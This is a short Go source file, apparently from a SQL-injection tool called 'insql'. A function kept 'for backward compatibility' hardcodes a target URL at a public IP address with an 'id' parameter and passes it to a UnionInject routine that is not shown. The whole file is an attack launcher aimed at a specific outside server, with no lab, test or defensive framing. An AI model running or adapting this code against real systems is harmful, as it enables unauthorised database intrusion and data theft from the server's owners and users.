package main

import "github.com/jingyi/insql/pkg"

// 保留原有的Insql函数以保持向后兼容
func Insql() {
	host := "http://47.108.225.199:8080/?id=1"
	pkg.UnionInject(host)
}
